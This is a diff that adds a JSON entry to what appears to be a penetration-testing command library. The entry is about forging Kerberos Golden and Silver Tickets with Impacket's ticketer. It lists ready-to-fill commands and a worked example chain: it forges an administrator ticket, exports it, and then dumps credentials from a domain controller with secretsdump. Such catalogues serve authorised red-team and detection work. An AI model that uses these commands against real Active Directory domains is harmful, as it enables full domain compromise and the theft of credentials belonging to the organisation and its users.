@@ -1,0 +1,22 @@
+{
+  "id": "impacket-ticketer-golden",
+  "name": "Impacket ticketer.py Golden Ticket",
+  "command": "impacket-ticketer -nthash <krbtgt-nt-hash> -domain-sid <domain-sid> -domain '<domain>' '<user>'",
+  "description": "Forge a Golden Ticket (TGT signed with the krbtgt key) granting any user, any privilege, until the krbtgt password is rotated twice. Save the resulting .ccache and export KRB5CCNAME to use it.",
+  "platform": "linux",
+  "requires": ["hash"],
+  "protocols": ["kerberos"],
+  "tags": ["impacket", "ticketer", "golden-ticket", "krbtgt", "forgery"],
+  "variations": [
+    { "label": "AES Key", "requires": "aes-key", "command": "impacket-ticketer -aesKey <aes256-key> -domain-sid <domain-sid> -domain '<domain>' '<user>'" },
+    { "label": "Silver Ticket (Service)", "requires": "hash", "command": "impacket-ticketer -nthash <service-nt-hash> -domain-sid <domain-sid> -domain '<domain>' -spn '<spn>' '<user>'" }
+  ],
+  "references": [
+    { "title": "Impacket ticketer", "url": "https://github.com/fortra/impacket/blob/master/examples/ticketer.py" }
+  ],
+  "examples": [
+    "impacket-ticketer -nthash aad3b...e0c089c0 -domain-sid S-1-5-21-... -domain corp.local administrator",
+    "export KRB5CCNAME=$(pwd)/administrator.ccache",
+    "impacket-secretsdump -k -no-pass corp.local/administrator@dc.corp.local"
+  ]
+}
